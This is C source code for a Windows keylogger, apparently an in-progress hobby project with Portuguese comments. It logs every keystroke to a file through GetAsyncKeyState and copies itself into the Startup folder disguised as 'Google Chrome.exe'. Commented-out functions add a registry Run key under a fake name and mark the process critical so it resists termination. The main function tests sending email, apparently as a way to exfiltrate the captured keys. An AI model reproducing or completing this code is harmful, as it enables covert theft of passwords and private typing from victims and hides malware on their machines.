#include <stdlib.h>
#include <stdio.h>
#include <windows.h>
#include <locale.h>
#include <time.h>
#include <string.h>
#include "include/sendmail.h"

void getWords();
int fileExists(char *file);
void hiddenProgram();
char convertAscii(int codAscii);

int main(int argc, char* argv[])
{
	// ShowWindow(GetForegroundWindow(), SW_HIDE);
	// hiddenProgram(argv[0]);	

	sendEmail("marlonnlm.026@gmail.com", "marlonmln.026@gmail.com", "Ola, estou testando meu app stmp", "Qualquer coisa, de fato nao importa, haha!");
	system("pause");
	// while(1)
	// {
	// 	Sleep(1);
	// 	getWords();
	// }
	return 0;
}


void getWords()
{	
	int keyState;
	FILE *file = NULL;
	file = fopen("C:\\Users\\Marlon Santos\\Desktop\\teclas.txt", "a");

	for(int keyCode=0; keyCode <= 255; keyCode++)
	{
		//Verifica o 'status' de uma tecla e guarda na variavel -32767 se ela foi pressionada
		keyState = GetAsyncKeyState(keyCode);
		
		//  GetKeyboardState

		if(keyState == -32767) {			
			char tec = convertAscii(keyCode);
			if(tec != 'z'){
				fprintf(file, "%c", tec);
				printf("%c", tec);
			}else{
				fprintf(file,"%c", keyCode);
				printf("%c", keyCode);
				// printf("%i", keyCode);
			}
		}
	}
	fclose(file);
}

void hiddenProgram(char* file)
{
	char* AllUsersProfile = getenv("allusersprofile");
	char destino[9999];
	strcpy(destino, AllUsersProfile);
	strcat(destino,"\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\Google Chrome.exe");
	if(!fileExists(destino)){
		CopyFile(file,destino,0);
	}
}

int fileExists(char *file)
{
    FILE *fp;
	fp = fopen(file,"r");
	if(fp){
		fclose(fp);
		return 1;
	}
	return 0;
}

// Função para tratar as teclas não alfa-numericas. (',' , '|', 'ç' , ';'...)
char convertAscii(int codAscii){
	char tecla;

	switch(codAscii){
		case 187: tecla = '='; break;
		case 188: tecla = ','; break;
		case 189: tecla = '-'; break;
		case 190: tecla = '.'; break;
		case 191: tecla = ';'; break;
		case 193: tecla = '/'; break;
	}
	return tecla;
}

// #define FAKE_NAME "\\secure.exe"
// #define FAKE_KEY "Secure Internet"

// void regApp () {
//     char system_ [MAX_PATH];
//     char pathToFile[MAX_PATH];
//     HMODULE getMod = GetModuleHandle (NULL);
    
//     GetModuleFileName (getMod, pathToFile, sizeof(pathToFile));
//     GetSystemDirectory (system_, sizeof( system_ ));
    
//     strcat (system_, FAKE_NAME);
    
//     CopyFile (pathToFile, system_, 0);
    
//     HKEY key_;
//     RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &key_);
//     RegSetValueEx(key_, FAKE_KEY, 0, REG_SZ, (const unsigned char *) system_, sizeof(system_));
//     RegCloseKey(key_);
// }
 
// int protectProcess() {
//     int enablePriv (const char * szPriv);
//     HANDLE DLL;
//     RtlSetProcessIsCritical setCritical;
 
//     DLL = LoadLibraryA ("ntdll.dll");
 
//     if(DLL == NULL)
// 		return -1;
 
// 	if (enablePriv(SE_DEBUG_NAME) < 0)
// 		return -1;
 
// 	setCritical = (RtlSetProcessIsCritical) GetProcAddress((HINSTANCE) DLL, "RtlSetProcessIsCritical");
// 	if (!setCritical)
// 		return -1;
// 	setCritical(1, 0, 0);

// 	return 0;
// }
 
// int enablePriv (const char * szPriv) {
//     HANDLE token;
//     LUID luid;
//     TOKEN_PRIVILEGES privs;
//     memset (&privs, 0, sizeof (privs));

//     if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token)) 
//         return -1;


//     if (!LookupPrivilegeValue(NULL, szPriv, &luid)){
//         CloseHandle (token);
//         return -1;
//     }

//     privs.PrivilegeCount = 1;
//     privs.Privileges[0].Luid= luid;
//     privs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

//     if (!AdjustTokenPrivileges (token, FALSE, &privs, sizeof (privs),NULL,NULL)) 
//         return -1;

//     CloseHandle (token);
//     return 0;
// }